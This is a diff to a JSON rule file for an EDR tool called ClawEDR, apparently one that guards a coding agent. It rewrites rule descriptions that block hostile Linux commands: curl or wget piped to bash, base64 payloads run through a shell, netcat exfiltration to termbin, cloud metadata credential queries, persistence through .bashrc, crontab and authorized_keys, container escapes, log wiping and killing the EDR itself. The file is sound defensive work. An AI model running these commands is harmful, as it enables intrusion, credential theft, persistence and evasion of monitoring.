+      "description": "Blocks tar commands that archive the .kube directory containing kubeconfig. Kubernetes credentials enable cluster access; blocking prevents kubeconfig exfiltration.",
       "severity": "critical"
     },
     "LIN-017": {
-      "description": "Base64 decode pipe to sh; obfuscated payload execution",
+      "description": "Blocks base64 -d | sh pipelines. Attackers obfuscate malicious scripts in base64 to evade detection. Decoding and piping to sh executes the payload. Blocking prevents obfuscated payload execution.",
       "severity": "critical"
     },
     "LIN-018": {
-      "description": "Base64 decode pipe to bash; obfuscated payload execution",
+      "description": "Blocks base64 -d | bash pipelines. Same as LIN-017 but with bash. Obfuscation is a common evasion technique.",
       "severity": "critical"
     },
     "LIN-019": {
-      "description": "Base64 --decode pipe to sh; obfuscated payload execution",
+      "description": "Blocks base64 --decode | sh pipelines. Alternative base64 flag. Blocking ensures coverage across base64 variants.",
       "severity": "critical"
     },
     "LIN-020": {
-      "description": "Python base64 decode; obfuscated payload execution",
+      "description": "Blocks Python one-liners that decode base64 and execute. Python can be used instead of shell pipes for obfuscated execution. Blocking prevents this evasion.",
       "severity": "critical"
     },
     "LIN-021": {
-      "description": "Node child_process; arbitrary command execution",
+      "description": "Blocks node -e with child_process, which can spawn arbitrary commands. Node is often used for cross-platform payload execution. Blocking prevents Node-based code execution.",
       "severity": "critical"
     },
     "LIN-022": {
-      "description": "Curl pipe to bash; remote code execution",
+      "description": "Blocks 'curl | bash' pipelines. A common attack pattern: fetch a script from the internet and execute it. No legitimate coding task requires executing arbitrary remote scripts. Blocking prevents remote code execution.",
       "severity": "critical"
     },
     "LIN-023": {
-      "description": "Curl pipe to sh; remote code execution",
+      "description": "Blocks 'curl | sh' pipelines. Same as LIN-022 with sh. The pipe-to-shell pattern is a primary vector for supply chain and initial access attacks.",
       "severity": "critical"
     },
     "LIN-024": {
-      "description": "Wget pipe to bash; remote code execution",
+      "description": "Blocks 'wget -qO- | bash' pipelines. wget is an alternative to curl for fetching and executing remote scripts. Blocking prevents this RCE vector.",
       "severity": "critical"
     },
     "LIN-025": {
-      "description": "Wget pipe to sh; remote code execution",
+      "description": "Blocks 'wget -qO- | sh' pipelines. Same as LIN-024 with sh. Comprehensive coverage for pipe-to-shell attacks.",
       "severity": "critical"
     },
     "LIN-026": {
-      "description": "Curl to Pastebin API; data exfiltration",
+      "description": "Blocks curl requests to the Pastebin API. Pastebin is used to exfiltrate data by posting content via API. Blocking prevents this exfiltration channel.",
       "severity": "high"
     },
     "LIN-027": {
-      "description": "Netcat to termbin; data exfiltration",
+      "description": "Blocks 'nc termbin.com 9999' which sends command output to termbin for exfiltration. Netcat to termbin is a classic data exfiltration technique. Blocking prevents output exfiltration.",
       "severity": "high"
     },
     "LIN-028": {
-      "description": "Tar .git dir; source and secret exfiltration",
+      "description": "Blocks tar of .git directory. The .git folder contains source code and may contain secrets (e.g., in config or accidentally committed). Blocking prevents source and secret exfiltration.",
       "severity": "high"
     },
     "LIN-029": {
-      "description": "Grep AWS keys in .git; credential hunting",
+      "description": "Blocks grep for AWS key patterns (AKIA) in .git. Attackers search for accidentally committed credentials. Blocking prevents credential hunting in version control.",
       "severity": "critical"
     },
     "LIN-030": {
-      "description": "Kill ClawEDR; EDR evasion",
+      "description": "Blocks kill commands targeting ClawEDR processes. Stopping the EDR allows the attacker to operate without detection. Blocking prevents EDR evasion.",
       "severity": "critical"
     },
     "LIN-031": {
-      "description": "Pkill ClawEDR; EDR evasion",
+      "description": "Blocks pkill targeting ClawEDR. Same as LIN-030; pkill can kill by process name. Blocking prevents EDR process termination.",
       "severity": "critical"
     },
     "LIN-032": {
-      "description": "Systemctl stop ClawEDR; EDR evasion",
+      "description": "Blocks systemctl stop clawedr. Systemd is the primary way to stop services. Blocking prevents EDR service shutdown.",
       "severity": "critical"
     },
     "LIN-033": {
-      "description": "Remove compiled policy; EDR evasion",
+      "description": "Blocks rm of compiled_policy.json. Removing the policy file would disable enforcement. Blocking prevents policy deletion as an evasion technique.",
       "severity": "critical"
     },
     "LIN-034": {
-      "description": "Echo to .bashrc; persistence",
+      "description": "Blocks echo appending to .bashrc. Modifying .bashrc creates persistence: the malicious command runs on every new shell. Blocking prevents shell-based persistence.",
       "severity": "critical"
     },
     "LIN-035": {
-      "description": "Echo to crontab; persistence",
+      "description": "Blocks echo appending to /etc/crontab. Crontab modifications create system-wide persistence. Blocking prevents cron-based persistence.",
       "severity": "critical"
     },
     "LIN-036": {
-      "description": "Append to authorized_keys; backdoor persistence",
+      "description": "Blocks echo of SSH public keys into authorized_keys. This adds the attacker's key for passwordless backdoor access. Blocking prevents SSH key persistence.",
       "severity": "critical"
     },
     "LIN-037": {
-      "description": "LD_PRELOAD injection; rootkit persistence",
+      "description": "Blocks echo to /etc/ld.so.preload. LD_PRELOAD injects libraries into every process; a malicious library can intercept calls and persist. Blocking prevents rootkit-style persistence.",
       "severity": "critical"
     },
     "LIN-038": {
-      "description": "Add root user to passwd; privilege escalation",
+      "description": "Blocks echo of root user entry into /etc/passwd. Adding a root-equivalent user enables privilege escalation. Blocking prevents passwd-based backdoor creation.",
       "severity": "critical"
     },
     "LIN-039": {
-      "description": "Disable SELinux; security control evasion",
+      "description": "Blocks setenforce 0 which disables SELinux. SELinux enforces mandatory access control; disabling it removes a security layer. Blocking prevents SELinux evasion.",
       "severity": "critical"
     },
     "LIN-040": {
-      "description": "Unload AppArmor; security control evasion",
+      "description": "Blocks apparmor_parser -R which unloads AppArmor profiles. AppArmor restricts process capabilities; unloading profiles removes restrictions. Blocking prevents AppArmor evasion.",
       "severity": "critical"
     },
     "LIN-041": {
-      "description": "Remove log files; evidence destruction",
+      "description": "Blocks rm -rf /var/log/* which deletes log files. Logs are evidence of attacker activity; deletion is evidence destruction. Blocking prevents log tampering.",
       "severity": "high"
     },
     "LIN-042": {
-      "description": "Clear shell history; evidence destruction",
+      "description": "Blocks history -c which clears shell history. Clearing history removes evidence of commands run. Blocking prevents history-based evidence destruction.",
       "severity": "medium"
     },
     "LIN-043": {
-      "description": "AWS IMDS query; cloud credential theft / SSRF",
+      "description": "Blocks curl to 169.254.169.254 (AWS IMDS). The Instance Metadata Service provides credentials to EC2 instances. Querying it from a compromised agent could steal IAM role credentials or enable SSRF. Blocking prevents cloud credential theft.",
       "severity": "critical"
     },
     "LIN-044": {
-      "description": "GCP metadata query; cloud credential theft",
+      "description": "Blocks curl to metadata.google.internal (GCP metadata). GCP instances can retrieve credentials from the metadata service. Blocking prevents GCP credential theft.",
       "severity": "critical"
     },
     "LIN-045": {
-      "description": "Docker socket access; container escape",
+      "description": "Blocks curl --unix-socket to the Docker socket. The Docker socket provides full daemon control. Blocking prevents container escape via Docker API abuse.",
       "severity": "critical"
     },
     "LIN-046": {
-      "description": "Cgroups release_agent; container escape to host",
+      "description": "Blocks writing to cgroups release_agent. The release_agent is executed when a cgroup is released; it can be abused to run commands on the host from a container. Blocking prevents this container escape technique.",
       "severity": "critical"
     },
     "LIN-047": {
-      "description": "Kubelet API; Kubernetes recon / escape",
+      "description": "Blocks curl to the Kubelet read-only API (port 10255). The Kubelet API can expose pod info and support container escape. Blocking prevents Kubernetes recon and escape.",
       "severity": "critical"
     },
     "LIN-048": {
-      "description": "Find SUID binaries; privilege escalation recon",
+      "description": "Blocks find / -perm -4000 which finds SUID binaries. SUID binaries are targets for privilege escalation. Blocking prevents recon that identifies escalation paths.",
       "severity": "high"
     },
     "LIN-049": {
-      "description": "Getcap recursive; capability recon for priv esc",
+      "description": "Blocks getcap -r / which recursively lists file capabilities. Capabilities can grant privileged operations; finding them is recon for privilege escalation. Blocking prevents capability-based recon.",
       "severity": "high"
     }
   }
